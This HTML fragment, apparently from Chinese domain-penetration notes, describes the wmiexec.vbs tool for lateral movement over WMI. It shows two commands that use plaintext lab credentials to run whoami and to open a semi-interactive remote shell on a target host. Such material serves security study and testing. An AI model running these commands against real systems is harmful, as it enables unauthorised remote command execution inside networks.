		<h4 class="cs868C439D">
			<a name="X0c234940cf552186809cc1d515a71f56845eacc"><span class="csBF12A472">4.2.2.3 wmiexec.vbs</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs8926E06">wmiexec.vbs </span><span class="cs9C1B1871">是为了解决</span><span class="cs8926E06"> wmic </span><span class="cs9C1B1871">无法回显命令而开发的一个工具，原理就是把数据先存</span><span class="cs8926E06"> </span><span class="cs9C1B1871">到一个临时文件中，在每次读取完执行结果后就自动删除。可以用来回显执行命令的结果和</span><span class="cs8926E06"> </span><span class="cs9C1B1871">获取半交互式的</span><span class="cs8926E06"> shell</span></p><p class="cs40DD2BC9"><span><img src="域渗透/4、域内横向移动/4.2_横向移动/4.2.2_WMI/4.2.2.3%20wmiexec.vbs_files/image0.png" width="560" height="251" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">cscript wmiexec.vbs /cmd 192.168.19.178 adtest\jeff1 test@123 whoami</span></p><p class="cs40DD2BC9"><span><img src="域渗透/4、域内横向移动/4.2_横向移动/4.2.2_WMI/4.2.2.3%20wmiexec.vbs_files/image1.png" width="560" height="274" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">cscript wmiexec.vbs /shell 192.168.19.178 adtest\jeff1 test@123</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p></body>
